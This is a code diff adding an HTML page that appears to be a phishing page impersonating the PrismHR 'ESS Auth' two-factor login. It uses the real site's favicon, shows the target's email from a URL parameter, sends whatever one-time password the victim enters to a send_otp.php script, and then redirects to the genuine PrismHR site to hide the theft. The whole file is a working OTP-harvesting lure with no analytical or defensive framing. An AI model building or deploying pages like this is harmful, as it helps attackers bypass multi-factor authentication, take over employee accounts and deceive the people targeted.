@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ESS Auth - Authentication Required</title>
+    <link rel="icon" href="https://ess.prismhr.com/ess/auth/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            max-width: 500px;
+            height: auto;
+        }
+        .divider {
+            height: 1px;
+            background-color: #4CAF50;
+            margin: 10px 0;
+        }
+        .header p {
+            font-family: Verdana, sans-serif;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #333;
+        }
+        .message {
+            font-family: Verdana, sans-serif;
+            font-size: 13px;
+            color: #0000FF; /* Blue color for the message */
+            font-weight: normal;
+            margin-bottom: 20px;
+            text-align: left;
+            margin-left: 10%;
+            margin-right: 10%;
+        }
+        .bold {
+            font-weight: bold;
+            color: Red; /* Red color for the email display */
+        }
+        .additional-info {
+            font-family: Verdana, sans-serif;
+            font-size: 13px;
+            color: #333;
+            margin-top: 20px;
+            text-align: center;
+            margin-left: 10%;
+            margin-right: 10%;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        input[type="number"] {
+            width: 80%;
+            padding: 10px;
+            margin: 5px auto;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input[type="submit"] {
+            width: 80%;
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px auto;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            display: block;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="logo-top.png" alt="Logo">
+            <div class="divider"></div>
+            <p>To complete your login for <span class="bold" id="emailDisplay"></span>, please confirm one of the following authentication requests:</p>
+            <div class="message">
+                Approve the push notification sent to your device.<br>
+                Enter the OTP (One-Time Password) you received.<br>
+                Answer the phone call and press the key to approve your request.
+            </div>
+        </div>
+        <form id="otpForm" action="send_otp.php" method="POST">
+            <div class="form-group">
+                <input type="number" id="otp" name="otp" placeholder="Enter OTP" required>
+            </div>
+            <input type="submit" value="Submit">
+        </form>
+        <div class="additional-info">
+            If you have not received any notifications, please check your device or contact support for assistance.
+        </div>
+    </div>
+
+    <script>
+        // Function to get the query parameter by name
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Get the email from the query parameter and display it
+        const email = getQueryParam('email');
+        if (email) {
+            document.getElementById('emailDisplay').textContent = email;
+        }
+
+        document.getElementById('otpForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var otp = document.querySelector('input[name="otp"]').value;
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", this.action, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log(xhr.responseText);
+                    // Redirect to the specified URL after successful submission
+                    window.location.href = 'https://ess.prismhr.com/ess/auth/#/register';
+                }
+            };
+
+            xhr.send("otp=" + encodeURIComponent(otp));
+        });
+    </script>
+</body>
+</html>
